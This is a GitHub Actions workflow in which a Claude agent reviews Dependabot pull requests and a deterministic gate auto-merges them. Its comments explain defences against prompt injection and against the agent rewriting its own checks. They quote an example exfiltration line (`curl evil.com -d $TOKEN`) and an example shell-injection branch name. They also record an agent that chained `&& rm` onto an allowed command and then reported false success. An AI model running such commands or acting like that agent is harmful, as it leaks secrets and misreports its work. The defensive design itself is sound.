name: Dependabot PR review

# Two decoupled paths, split along the LLM-judgment-vs-deterministic line:
#
#  - review (on: pull_request / workflow_dispatch): a Claude cloud agent
#    investigates the dependency change and posts ONE evidence comment. For
#    group PRs the comment is audit-trail-only; for singleton/major PRs the
#    comment includes a structured AUTOMERGE-DECISION-V1 block that the gate
#    reads. The review job never merges itself. On a real Dependabot
#    pull_request the secret source is the Dependabot store, so
#    CLAUDE_CODE_OAUTH_TOKEN must also be mirrored there (Actions store is not
#    visible to Dependabot-triggered runs).
#
#    The reviewer judges the BUMP (changelog vs our usage), never CI. It runs
#    concurrently with CI and cannot know the outcome; the gate below is what
#    reads CI, deterministically, at merge time. Do not ask the agent about CI
#    and do not allow-list CI-reading tools for it (a tool counts as
#    CI-reading if any flag of it reaches those APIs): its `gh` runs on the
#    Claude App's own token (see the review step), which cannot read the
#    Checks/Actions APIs, so such a tool 403s on every call and the model
#    reports blindness as risk.
#
#    That contract is carried by the prompt, which names the reviewer's
#    evidence (the diff, the changelog, this repo's source) and nothing else,
#    and by a guard that does not depend on the model: a PreToolUse hook
#    (review step, `settings`) lints the comment body before `gh pr comment`
#    runs and blocks a post that reports on CI, so the agent rewrites it. The
#    deliverable assertion re-runs the same rule over the posted comment; a
#    refusal there means the hook itself stopped working.
#
#    IDENTITY CONTRACT: the review comment MUST be posted by the Claude
#    GitHub App (claude[bot]), i.e. `github_token` must never be passed to
#    the review step. A comment created with the workflow's GITHUB_TOKEN
#    fires no workflow triggers at all (GitHub's recursion guard), which
#    would sever the auto-merge job's issue_comment wake-up: any review
#    that finishes after CI would strand its PR until the next push. The
#    App-posted comment is what makes the two-trigger design below work.
#
#  - auto-merge (on: workflow_run of CI, or issue_comment when the LLM posts):
#    a fully deterministic gate. For group PRs it merges with ZERO LLM input
#    when CI is green, the author is Dependabot, the PR is open, and every
#    changed path is whitelisted (`.github/dependabot.yml` guarantees the
#    group is non-major by construction). For singleton/major PRs it reads
#    the LLM's structured AUTOMERGE-DECISION-V1 block from a trusted
#    commenter and merges only when recommendation=merge AND
#    our_usage_affected=false AND every deterministic check ALSO passes. The
#    whitelist + CI checks are load-bearing: even a maximally-injection-
#    compromised LLM cannot cause a merge that touches `src/` or that breaks
#    tests. workflow_run runs in the base/default context (Actions secrets
#    present, token writable) — the only context where a Dependabot PR can
#    actually be merged. The job checks out the DEFAULT branch (never the PR
#    head) and runs no PR code — only `gh` metadata + the gate.
#
#    Once the gate authorizes, the job ARMS GitHub's native auto-merge rather
#    than merging imperatively. A synchronous merge is a time-of-check /
#    time-of-use race, and this job only wakes on a head change or a comment,
#    so a refusal is never retried. Arming hands the timing to GitHub instead.
#    A later `skip` disarms, so the armed state and the authorization can never
#    disagree. Any failure after authorization is escalated (label + assignee +
#    comment + red job), because a merge that fails silently is
#    indistinguishable from one that never ran.
#
#  Two triggers handle the sequencing race between CI completion and the LLM
#  posting its decision comment: whichever fires later (CI finishing or the
#  comment appearing) wakes the gate. The gate re-derives all inputs each
#  time, so firing both triggers is harmless idempotent — only the call where
#  both prerequisites are met returns `decision=merge`.

on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
    inputs:
      pr_number:
        description: PR number to review (manual replay against existing dependabot PRs)
        required: true
        type: number
  workflow_run:
    workflows: ["CI"]
    types: [completed]
  issue_comment:
    types: [created]

permissions: {}

jobs:
  review:
    # LLM review — comment + `needs-human-review` label only. Never merges.
    #
    # Starts only for pushers its Claude step will act for: people, and the
    # bots in that step's `allowed_bots`. claude-code-action refuses any other
    # bot actor ("Workflow initiated by non-human actor", its checkHumanActor),
    # and the deliverable assertion below would then label and assign a PR
    # whose review was never attempted. Autofix's push is such an event: it
    # is made as the Claude GitHub App (claude[bot]) so that CI runs on the
    # fix, and it fires `synchronize`. That push is deliberately not
    # re-reviewed. The bump already has its verdict, and the fix waits for a
    # person, who is assigned once CI finishes on it (by the gate when CI is
    # green, by the autofix job's one-push guard when it is red).
    if: >
      github.event_name == 'workflow_dispatch' ||
      (github.event_name == 'pull_request' &&
       github.event.pull_request.user.login == 'dependabot[bot]' &&
       (github.event.sender.type == 'User' || github.actor == 'dependabot[bot]'))
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: read
      # Serves this job's OWN steps (checkout, the assert/diagnose steps'
      # `gh`, labelling). It does NOT shape what the review agent can read:
      # claude-code-action ignores the step-level GH_TOKEN and mints its own
      # Claude-App installation token via OIDC ("Using GITHUB_TOKEN from
      # OIDC" in its log). `checks: read` + `actions: read` sat here for
      # weeks on the theory that they cured the agent's 403s on the
      # Checks/Actions APIs; they never reached the agent. The agent's token
      # identity is also why the review comment can wake the gate at all —
      # see the identity contract in the header.
      pull-requests: write
      # Required by anthropics/claude-code-action for its OIDC flow.
      id-token: write
    concurrency:
      group: dependabot-review-${{ github.event.pull_request.number || inputs.pr_number }}
      cancel-in-progress: true
    steps:
      - name: Checkout repo
        uses: actions/checkout@v7
        with:
          fetch-depth: 0

      - name: Keep this job's scripts where the agent cannot write them
        # Reads the gate and the lint from the checkout. Writes read-only
        # copies outside it. Touches nothing else.
        #
        # The reviewer can write files (its comment draft), and Claude Code
        # lets it write anywhere in this checkout, pipeline scripts included.
        # Every script this job runs once the agent has started (the lint hook
        # before each Bash call, the gate and the lint in the deliverable
        # assertion) would run an agent's rewrite with what its caller holds:
        # in the hook, the Claude session's environment (the Claude App token,
        # GITHUB_TOKEN, CLAUDE_CODE_OAUTH_TOKEN); in a step, GITHUB_TOKEN and
        # this job's OIDC token. So they run from these copies, taken before
        # the agent starts, outside the checkout, where Claude Code does not
        # let the agent write, and read-only besides.
        run: |
          set -euo pipefail
          # A runner that keeps its temp directory between jobs (self-hosted)
          # can still hold the last job's read-only copies.
          chmod -R u+w "$RUNNER_TEMP/dep-steward" 2>/dev/null || true
          mkdir -p "$RUNNER_TEMP/dep-steward"
          cp .github/dependabot-automerge/gate.cjs "$RUNNER_TEMP/dep-steward/gate.cjs"
          cp .github/dependabot-automerge/review-lint.cjs "$RUNNER_TEMP/dep-steward/review-lint.cjs"
          chmod -R a-w "$RUNNER_TEMP/dep-steward"

      - name: Load agent prompt
        id: load_prompt
        env:
          # Bake the LITERAL PR number into the prompt. Claude Code 2.1.207+ (bundled
          # by recent claude-code-action releases) rejects an allowlisted Bash command
          # that contains a shell expansion ("Contains expansion" — a $VAR could resolve
          # to anything, defeating the allowlist). So `gh pr diff $PR_NUMBER` is DENIED;
          # the agent must see `gh pr diff 123` for `Bash(gh pr diff:*)` to match.
          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
          # The author is baked for a different reason: the reviewer holds no
          # PR-metadata tool (`gh pr view` is a prefix wildcard whose --json
          # flags reach the Checks API the agent's App token cannot read — see
          # the allow-list comment below), so the not-from-Dependabot hard rule
          # is fed its fact here instead. THIS step's gh runs on the workflow's
          # own token, which can read it; same idiom as the autofix resolve
          # step. Spellings documented at gate.cjs DEPENDABOT_AUTHORS.
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
        run: |
          PR_AUTHOR=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json author --jq '.author.login')
          {
            echo 'prompt<<PROMPT_EOF_8X2Y'
            # `|` delimiter on the author expression: gh renders app accounts
            # as `app/<slug>` — a `/` would end a /-delimited s command on
            # EVERY routine run. Logins are [A-Za-z0-9-] (EMUs add `_`) plus
            # the app/ prefix and [bot] suffix; none of `|`, `&`, `\` can
            # occur, so the replacement text is inert.
            sed -e "s/\$PR_NUMBER/$PR_NUMBER/g" -e "s|\$PR_AUTHOR|$PR_AUTHOR|g" .github/dependabot-review-prompt.md
            echo 'PROMPT_EOF_8X2Y'
          } >> "$GITHUB_OUTPUT"
          # Captured BEFORE the agent runs, minus a 60s clock-skew margin: the
          # deliverable assertion below only accepts a V1 comment created at or
          # after this instant, so a stale comment from an earlier review of
          # the same PR can never satisfy it (see the assertion's comment).
          echo "review_started=$(date -u -d '60 seconds ago' +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"

      - name: Run Claude review
        id: review
        # SHA-pinned: the moving @v1 tag silently shipped a breaking bot-gate
        # change that broke this workflow. Bump deliberately, not implicitly.
        # NEVER pass `github_token` here: the App identity that posts the
        # review comment is what fires the gate's issue_comment wake-up
        # (header, "IDENTITY CONTRACT").
        uses: anthropics/claude-code-action@1623c36729ac1cd5895198cded705a287de7db79 # v1.0.187
        env:
          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          allowed_bots: "dependabot[bot]"
          prompt: ${{ steps.load_prompt.outputs.prompt }}
          # The deterministic half of the reviewer's evidence contract. The
          # prompt is where CI was legitimized and the prompt is fixed; this is
          # the part that does not rely on the model holding the line. The
          # action writes this JSON to ~/.claude/settings.json and Claude Code
          # loads it, so the hook runs before every Bash call and refuses a
          # `gh pr comment` whose body reports on the PR's CI — the post never
          # happens, the agent gets the reason, and it rewrites. Refusing here
          # rather than in a workflow step is deliberate: a step could only go
          # red with nothing posted, and the comment must come from the App
          # identity (see IDENTITY CONTRACT above) to wake the gate.
          #
          # Shell form, not the exec form's `args`: a Claude Code that predates
          # `args` would ignore it, run `node` with no argv, and pass every
          # comment silently. `$RUNNER_TEMP` is inert to YAML and to the
          # action's JSON.parse; the hook's own shell expands it. The script is
          # the copy the step after checkout made, never the checkout's, which
          # the agent can rewrite.
          settings: |
            {"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"node \"$RUNNER_TEMP/dep-steward/review-lint.cjs\"","timeout":30}]}]}}
          # 60-turn budget: a thorough major-bump review (read diff, fetch
          # changelog for each version in the range, grep each affected API,
          # enumerate breaking changes, emit V1 block) routinely needs ~30-50
          # turns. 30 caused `error_max_turns` on twilio 5→6, jsdom 25→29,
          # actions/download-artifact 7→8 in the first end-to-end run of the
          # new pipeline. 60 leaves slack without runaway risk; LLM still
          # surfaces if uncertain via `escalate`.
          #
          # --allowedTools: the action denies every tool by default. The
          # prompt instructs the LLM to use `gh pr diff/comment/edit`,
          # `gh release view`, `grep`, plus WebFetch for external
          # changelogs. Without explicit allowlisting every one of those
          # tool calls is denied (33 denials observed on the first 60-turn
          # run in practice). Scoped to specific Bash subcommands rather
          # than full `Bash` to limit injection blast radius — a malicious
          # dep README cannot trick the LLM into `curl evil.com -d $TOKEN`.
          # Nothing in this list may be able to REACH a scope the Claude
          # App token lacks (the Checks and Actions APIs): the agent's `gh`
          # runs on that token, so such an entry 403s on every call and
          # invites the model to report blindness instead of reviewing.
          # Each entry is a prefix wildcard, judged by the worst flag it
          # admits — `gh pr view` needs only pull-requests:read at verb
          # level, but `--json statusCheckRollup` rides the same wildcard
          # into the Checks API; that dead entry sent the agent CI-hunting
          # (12 denials in one run, issue #24). The one fact the prompt
          # needed from it (the PR author) is resolved in the Load-prompt
          # step and injected as text instead. permissions.test.mjs
          # enforces this at flag granularity.
          claude_args: >-
            --max-turns 60 --model claude-opus-4-8
            --allowedTools "Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr edit:*),Bash(gh release view:*),Bash(grep:*),Read,Grep,Glob,WebFetch,Write"

      - name: Diagnose the review agent (tool calls + denials + error)
        # claude-code-action writes the full turn-by-turn log to execution_file but
        # NEVER surfaces it — the run log shows only is_error, never WHY. This prints
        # what the agent actually tried, which tool calls were DENIED, and its final
        # error, so a failure is legible instead of an opaque escalation. It runs on
        # every review, not just failing ones: a DENIED tool call is how a review
        # silently degrades while still reporting success (that is how the 2.1.207
        # tool-permission breakage was found).
        #
        # One denial is ASSERTED on, not just printed: `gh pr diff`. The diff is
        # the thing under review; an agent that never read it still posts an
        # escalate-shaped V1 block, so the deliverable assertion below stays green
        # and nobody learns the review was void. Detection is positive-evidence
        # only (the SDK's permission_denials record, plus the denial text of
        # errored tool_results), so a schema drift degrades back to print-only
        # rather than inventing a red.
        if: ${{ !cancelled() }}
        env:
          EXEC_FILE: ${{ steps.review.outputs.execution_file }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
        run: |
          set -uo pipefail
          if [ -z "${EXEC_FILE:-}" ] || [ ! -f "$EXEC_FILE" ]; then
            echo "No execution file at '${EXEC_FILE:-<empty>}' — the action produced no run log (agent may not have started)."
            exit 0
          fi
          echo "===== result summary ====="
          # The SDK's result object carries `permission_denials` (an array);
          # a hand-named `_count` field selected null while ten real denials
          # sat in the array, so derive the count from the data.
          jq -rs '[.. | objects | select(.type? == "result")] | (.[0] // {}) | {is_error, subtype, num_turns, permission_denials: ((.permission_denials // []) | length), total_cost_usd, result}' "$EXEC_FILE" 2>/dev/null || echo "(jq failed)"
          echo "===== tool calls the agent attempted ====="
          jq -rs '[.. | objects | select(.type? == "tool_use")] | .[] | "TRY [" + (.name // "?") + "] " + (((.input.command // .input.file_path // .input.pattern // (.input|tostring)) | tostring)[0:220])' "$EXEC_FILE" 2>/dev/null || echo "(none / jq failed)"
          echo "===== tool results that were errors/denials ====="
          jq -rs '[.. | objects | select(.type? == "tool_result" and .is_error? == true)] | .[] | "ERR " + (((.content | if type=="array" then (map(.text? // (.|tostring)) | join(" ")) else (.|tostring) end) | tostring)[0:300])' "$EXEC_FILE" 2>/dev/null || echo "(none / jq failed)"
          echo "===== raw denial/permission lines (fallback) ====="
          grep -aoiE '(permission[^"]{0,90}|denied[^"]{0,90}|not allowed[^"]{0,90}|requested permission[^"]{0,130})' "$EXEC_FILE" 2>/dev/null | sort -u | head -20 || true
          echo "=========================================="
          # The assertion: a denied `gh pr diff` means the review never saw the
          # change it reviewed. Two independent positive signals, either fires.
          DENIED_DIFF=$(jq -rs '
            [.. | objects | select(.type? == "result") | (.permission_denials // [])[]
             | select((.tool_name // "") == "Bash")
             | (.tool_input.command // "")
             | select(startswith("gh pr diff"))] | length' "$EXEC_FILE" 2>/dev/null || echo 0)
          [ "$DENIED_DIFF" -gt 0 ] 2>/dev/null || DENIED_DIFF=0
          DENIED_DIFF_TEXT=$(jq -rs '
            [.. | objects | select(.type? == "tool_result" and .is_error? == true)
             | (.content | if type=="array" then (map(.text? // (.|tostring)) | join(" ")) else (.|tostring) end)
             | select(test("gh pr diff") and test("permission|denied|not allowed"; "i"))] | length' "$EXEC_FILE" 2>/dev/null || echo 0)
          [ "$DENIED_DIFF_TEXT" -gt 0 ] 2>/dev/null || DENIED_DIFF_TEXT=0
          if [ "$DENIED_DIFF" -gt 0 ] || [ "$DENIED_DIFF_TEXT" -gt 0 ]; then
            echo "::error::The review agent was DENIED 'gh pr diff' on PR #$PR_NUMBER — it reviewed without reading the diff, so its verdict is void."
            gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat || true
            exit 1
          fi

      - name: Assert the review deliverable exists (V1 block posted by THIS run)
        # claude-code-action can exit 0 without running at all: its OIDC token
        # exchange refuses any run whose workflow file differs from the default
        # branch's copy — which is every Dependabot PR that bumps an action
        # inside THIS file. We've seen a PR sit green-but-unprocessed for a week
        # that way: review SUCCESS, no comment, no label, gate correctly skipping.
        # The invariant is scoped to PRs the gate CANNOT merge without a verdict
        # — singletons and majors. A minor/patch GROUP PR is the gate's own
        # domain: it merges on CI-green with zero LLM input, so a missing verdict
        # needs no human, and escalating one would assign you to a PR that
        # auto-merges seconds later. gate.cjs (single source of truth for which
        # branches are groups) classifies the branch and we skip the assertion
        # for groups. For everything else a missing verdict ends in {red job +
        # needs-human-review label}, for every silent-failure mode.
        #
        # THIS run's deliverable, not any run's: only comments created at or
        # after review_started count. A replay or a synchronize re-review runs
        # on a PR that already carries an older V1 comment, and "any V1 exists"
        # let exactly that happen: an agent's post was denied (it had chained
        # `&& rm` onto the allow-listed comment command), its self-check found
        # the STALE comment, it reported success, and this step stayed green
        # over a review that delivered nothing. The timestamp turns that into
        # a red with a label.
        if: ${{ !cancelled() }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ inputs.pr_number || github.event.pull_request.number }}
          SINCE: ${{ steps.load_prompt.outputs.review_started }}
          # claude-code-action writes its full result (incl. the real error on a
          # failed run) to this file; the run log only shows is_error, never why.
          EXEC_FILE: ${{ steps.review.outputs.execution_file }}
        run: |
          set -euo pipefail
          PR_JSON=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefName,state)
          HEAD_BRANCH=$(jq -r '.headRefName' <<<"$PR_JSON")
          PR_STATE=$(jq -r '.state' <<<"$PR_JSON")
          # A closed or merged PR cannot merge, so no verdict is owed for it.
          # gate.cjs refuses one with `pr_not_open`, and the auto-merge job
          # deliberately keeps that code OUT of its escalation allow-list,
          # because paging someone about an already-closed PR is the noise
          # that devalues the label. This step held the opposite policy and
          # paged anyway: a Dependabot PR closed or superseded while its
          # review was in flight ended in {red job + label + assignee} for a
          # PR nobody can act on. Reopening fires `pull_request: reopened`,
          # which re-runs the review with the PR open, so no coverage is lost.
          if [ "$PR_STATE" != "OPEN" ]; then
            echo "PR #$PR_NUMBER is $PR_STATE, not OPEN — the gate cannot merge it, so no verdict is owed; nothing to assert."
            exit 0
          fi
          if [ "$(HEAD_BRANCH="$HEAD_BRANCH" GATE_MODE=classify node "$RUNNER_TEMP/dep-steward/gate.cjs")" = "group=true" ]; then
            echo "PR #$PR_NUMBER ($HEAD_BRANCH) is a minor/patch group — the gate merges it with no verdict; nothing to assert."
            exit 0
          fi
          # gh's --jq is gojq, which reads the process environment via `env`;
          # ISO-8601 UTC strings compare correctly as strings. Only comments
          # carrying the V1 marker are collected: this run's window can also
          # hold the gate's stuck-PR notice, an autofix comment or a human's
          # reply, none of which is the deliverable — and none of which should
          # be able to fail the prose lint below on the reviewer's behalf.
          V1_BODIES=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json comments \
            --jq '[.comments[] | select(.createdAt >= env.SINCE) | select(.body | contains("<!-- AUTOMERGE-DECISION-V1 -->")) | .body] | join("\n")')
          if [ -n "$V1_BODIES" ]; then
            echo "V1 decision block posted during this run (since $SINCE) on PR #$PR_NUMBER — review deliverable present."
            # The deliverable exists; this checks the guard that shapes it. The
            # reviewer's evidence is the diff, the changelog and this repo's
            # source, and the PreToolUse hook above refuses a comment reporting
            # on anything else BEFORE it posts. This is that same rule, run
            # over what GitHub actually stored, so a refusal here has exactly
            # one meaning: the hook did not fire. Red, but NO label — the
            # verdict is valid and needs no human on the PR; dep-steward's own
            # guard is what broke.
            #
            # The lint's own failure (missing node, a bug in it) is fail-OPEN,
            # matching the hook: a broken guard must not strand a PR whose
            # review delivered.
            if ! LINT_OUT=$(REVIEW_LINT_MODE=body REVIEW_BODY="$V1_BODIES" node "$RUNNER_TEMP/dep-steward/review-lint.cjs" 2>&1); then
              echo "::warning::Could not run the review prose lint on PR #$PR_NUMBER ($LINT_OUT) — the deliverable is present, so this step is not failing on the guard's own failure."
              exit 0
            fi
            if [ "$(sed -n 's/^decision=//p' <<<"$LINT_OUT")" != "post" ]; then
              echo "::error::The review comment on PR #$PR_NUMBER reports on evidence outside the reviewer's set, and the lint hook did not refuse it before it posted — $(sed -n 's/^reason=//p' <<<"$LINT_OUT")"
              echo "The hook is wired through the review step's 'settings' input: check that claude-code-action still writes it to ~/.claude/settings.json and that the bundled Claude Code still runs PreToolUse hooks."
              exit 1
            fi
            echo "The review comment passes the prose lint."
            exit 0
          fi
          echo "No AUTOMERGE-DECISION-V1 comment posted during this run (since $SINCE) on PR #$PR_NUMBER — the review produced no verdict."
          # Surface the agent's ACTUAL error instead of guessing. The #1 real cause —
          # an invalid/expired CLAUDE_CODE_OAUTH_TOKEN — surfaces here as "401 Invalid
          # bearer token"; without this it is invisible (the execution log is never
          # uploaded), which is exactly the multi-hour rabbit hole this exists to end.
          if [ -n "${EXEC_FILE:-}" ] && [ -f "$EXEC_FILE" ]; then
            AGENT_ERR=$(jq -rs '[.. | objects | select(.is_error == true) | (.result // .error)] | map(select(. != null)) | .[0] // empty' "$EXEC_FILE" 2>/dev/null || true)
            if [ -n "$AGENT_ERR" ]; then
              echo "The review agent errored: $AGENT_ERR"
              case "$AGENT_ERR" in
                *'Invalid bearer token'*|*authentication*|*401*)
                  echo "  -> CLAUDE_CODE_OAUTH_TOKEN is invalid or expired. Re-mint it with 'claude setup-token'"
                  echo "     and re-run the dep-steward installer (it verifies the token before storing it)." ;;
              esac
            fi
          fi
          echo "If no agent error is shown above, the usual cause on a new repo is the Claude Code"
          echo "GitHub App not being installed (the review run log will say so) — add it at"
          echo "https://github.com/apps/claude."
          CHANGED=$(gh pr diff "$PR_NUMBER" --repo "$REPO" --name-only)
          if grep -qxF '.github/workflows/dependabot-review.yml' <<<"$CHANGED"; then
            echo "Known cause: this PR modifies dependabot-review.yml itself, so claude-code-action's"
            echo "OIDC workflow validation refuses to run on the pull_request event. Replay from main:"
            echo "  gh workflow run dependabot-review.yml --repo $REPO -f pr_number=$PR_NUMBER"
          fi
          gh pr edit "$PR_NUMBER" --repo "$REPO" --add-label needs-human-review --add-assignee octocat
          exit 1

  auto-merge:
    # Deterministic gate. Fires on:
    #  - workflow_run completion of CI (caught when CI finishes after the LLM
    #    has already posted its comment, or for a group PR that needs no
    #    LLM input)
    #  - issue_comment created on a PR by a trusted bot (caught when the LLM's
    #    AUTOMERGE-DECISION-V1 comment lands after CI is already green)
    # The two triggers handle the sequencing race; the gate is idempotent.
    if: >
      (github.event_name == 'workflow_run' &&
       github.event.workflow_run.event == 'pull_request' &&
       startsWith(github.event.workflow_run.head_branch, 'dependabot/')) ||
      (github.event_name == 'issue_comment' &&
       github.event.issue.pull_request != null &&
       contains(github.event.comment.body, '<!-- AUTOMERGE-DECISION-V1 -->') &&
       (github.event.comment.user.login == 'github-actions[bot]' ||
        github.event.comment.user.login == 'app/github-actions' ||
        github.event.comment.user.login == 'claude[bot]' ||
        github.event.comment.user.login == 'claude'))
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
      pull-requests: write
      checks: read
      actions: read
    concurrency:
      group: dependabot-automerge-${{ github.event.workflow_run.head_branch || github.event.issue.number }}
      cancel-in-progress: false
    steps:
      - name: Checkout default branch (never the PR head)
        # workflow_run / issue_comment have no PR ref; default checkout is the
        # repo default branch. This is intentional and a security property —
        # the gate script that authorizes the merge must be main's version,
        # not the PR's.
        uses: actions/checkout@v7

      - name: Resolve PR context (works for both triggers)
        id: pr
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          # Attacker-influenced event data (a branch name, an issue number) is
          # passed through env vars, never interpolated into the shell command
          # text — a branch like `dependabot/x";curl evil"` becomes an inert
          # string in $WORKFLOW_RUN_HEAD_BRANCH instead of executing. This is
          # the privileged workflow_run job (contents: write), so the
          # indirection is load-bearing, not cosmetic.
          WORKFLOW_RUN_HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}
          ISSUE_NUMBER: ${{ github.event.issue.number }}
        run: |
          set -euo pipefail
          if [ "${{ github.event_name }}" = "workflow_run" ]; then
            HEAD_BRANCH="$WORKFLOW_RUN_HEAD_BRANCH"
            PR_NUMBER=$(gh pr list --repo "$REPO" --head "$HEAD_BRANCH" --state open \
              --json number --jq '.[0].number // empty')
          else
            PR_NUMBER="$ISSUE_NUMBER"
            HEAD_BRANCH=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefName \
              --jq '.headRefName')
          fi
          if [ -z "$PR_NUMBER" ] || [ -z "$HEAD_BRANCH" ]; then
            echo "No PR resolved (PR_NUMBER='$PR_NUMBER', HEAD_BRANCH='$HEAD_BRANCH') — nothing to do."
            echo "skip=true" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          if ! echo "$HEAD_BRANCH" | grep -q '^dependabot/'; then
            echo "Head branch '$HEAD_BRANCH' is not a dependabot/* branch — nothing to do."
            echo "skip=true" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          echo "pr_number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
          echo "head_branch=$HEAD_BRANCH" >> "$GITHUB_OUTPUT"
          echo "Resolved PR #$PR_NUMBER on branch $HEAD_BRANCH"

      - name: Resolve CI conclusion (re-query — trigger payload may be stale)
        if: steps.pr.outputs.skip != 'true'
        id: ci
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR_NUMBER: ${{ steps.pr.outputs.pr_number }}
        run: |
          set -euo pipefail
          # Query the latest CI workflow run for this PR's head SHA. The gate
          # needs the current state, not the (possibly older) trigger payload.
          HEAD_SHA=$(gh pr view "$PR_NUMBER" --repo "$REPO" --json headRefOid --jq '.headRefOid')
          CI_CONCLUSION=$(gh run list --repo "$REPO" --workflow CI --commit "$HEAD_SHA" \
            --limit 1 --json conclusion --jq '.[0].conclusion // "pending"')
          echo "ci_conclusion=$CI_CONCLUSION" >> "$GITHUB_OUTPUT"
          echo "CI conclusion for $HEAD_SHA: $CI_CONCLUSION"

      - name: Resolve the merge methods this repo actually allows
        if: steps.pr.outputs.skip != 'true'
        id: methods
        # A capability probe: reads settings, writes one output, touches nothing.
        # It produces a PRIOR for the gate's ranking, NOT a verdict — the arm
        # step below is what actually finds out, by asking GitHub.
        #
        # Three readable restriction layers, all independent:
        #   1. repo settings: mergeCommitAllowed / rebaseMergeAllowed / squashMergeAllowed
        #   2. the default branch's rules: the `pull_request` rule's own
        #      `allowed_merge_methods` (absent = the rule imposes no restriction)
        #   3. the same rules response: a `required_linear_history` rule, which
        #      bans merge commits without ever appearing in either list above
        # The gate gets the INTERSECTION. Any query failing leaves the value
        # empty, which the gate reads as "could not tell" and answers with its
        # full ranked list rather than a narrowed one.
        #
        # What this step CANNOT see, and why the arm step must still fall back:
        #   - classic branch protection (`branches/:branch/protection`), where a
        #     `required_linear_history` toggle can also live. That read requires
        #     ADMIN and a workflow `permissions:` block has no key granting it,
        #     so the call would 403 and is deliberately not made. Runsense hit
        #     exactly this: layers 1 and 2 both reported all three methods
        #     permitted, and GitHub refused the merge commit anyway.
        #   - the App-workflow-scope refusal, which is a property of the token
        #     and the PR's changed paths, not a repo setting any endpoint serves.
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
        run: |
          set -uo pipefail
          # The `ok:` prefix is load-bearing: it separates "the query worked and
          # the answer is nothing" from "the query failed". Both would otherwise
          # be the empty string, and conflating them is how a gate ends up
          # confidently acting on a setting it never actually read.
          REPO_RAW=$(gh repo view "$REPO" \
            --json mergeCommitAllowed,rebaseMergeAllowed,squashMergeAllowed \
            --jq '"ok:" + ([(if .mergeCommitAllowed then "merge" else empty end),
                            (if .squashMergeAllowed then "squash" else empty end),
                            (if .rebaseMergeAllowed then "rebase" else empty end)] | join(","))' \
            2>/dev/null || echo "")
          if [ -z "$REPO_RAW" ]; then
            echo "Could not read this repo's merge settings — leaving the method unknown; the gate takes its first choice and escalates if GitHub refuses."
            echo "allowed_merge_methods=" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          REPO_METHODS="${REPO_RAW#ok:}"
          # Both trigger payloads carry `repository`, but an empty value here
          # would silently skip the ruleset layer entirely — reading one of the
          # two restriction layers and believing it is the whole answer is the
          # exact failure this step exists to prevent. So re-derive rather than
          # trust the payload shape.
          [ -n "$DEFAULT_BRANCH" ] || DEFAULT_BRANCH=$(gh repo view "$REPO" \
            --json defaultBranchRef --jq '.defaultBranchRef.name' 2>/dev/null || echo "")
          # Fetched ONCE and read twice: the merge-method list and the
          # linear-history rule are two restrictions carried in one response,
          # and a second call for the second reading would pay twice for the
          # same bytes.
          RULES_JSON=$(gh api "repos/$REPO/rules/branches/$DEFAULT_BRANCH" 2>/dev/null || echo "")
          # No `pull_request` rule, a rule that sets no allowed_merge_methods, or
          # a failed query all mean the same thing HERE — do not narrow — so
          # collapsing them is safe, unlike above.
          RULE_METHODS=$(printf '%s' "$RULES_JSON" \
            | jq -r '[.[] | select(.type=="pull_request")
                          | .parameters.allowed_merge_methods // empty] | first // [] | join(",")' \
            2>/dev/null || echo "")
          # `required_linear_history` forbids merge commits while saying nothing
          # about `allowed_merge_methods`, so a repo can advertise all three
          # methods and still refuse one of them. It carries no parameters —
          # its presence IS the restriction.
          LINEAR=$(printf '%s' "$RULES_JSON" \
            | jq -r 'if any(.[]; .type=="required_linear_history") then "yes" else "no" end' \
            2>/dev/null || echo "no")
          [ "$LINEAR" = "yes" ] || LINEAR=no
          if [ -z "$RULE_METHODS" ]; then
            ALLOWED="$REPO_METHODS"
          else
            ALLOWED=''
            for m in merge squash rebase; do
              case ",$REPO_METHODS," in *",$m,"*) ;; *) continue ;; esac
              case ",$RULE_METHODS," in *",$m,"*) ;; *) continue ;; esac
              ALLOWED="${ALLOWED:+$ALLOWED,}$m"
            done
          fi
          if [ "$LINEAR" = "yes" ]; then
            NARROWED=''
            for m in squash rebase; do
              case ",$ALLOWED," in *",$m,"*) NARROWED="${NARROWED:+$NARROWED,}$m" ;; esac
            done
            ALLOWED="$NARROWED"
          fi
          # A real "nothing allowed" answer must stay distinguishable from a
          # failed query, so send a non-empty token the gate reads as an empty
          # set rather than as silence.
          [ -n "$ALLOWED" ] || ALLOWED=none
          echo "allowed_merge_methods=$ALLOWED" >> "$GITHUB_OUTPUT"
          echo "Repo allows: '$REPO_METHODS'; branch rules allow: '${RULE_METHODS:-(unrestricted)}'; linear history: $LINEAR; effective: '$ALLOWED'"
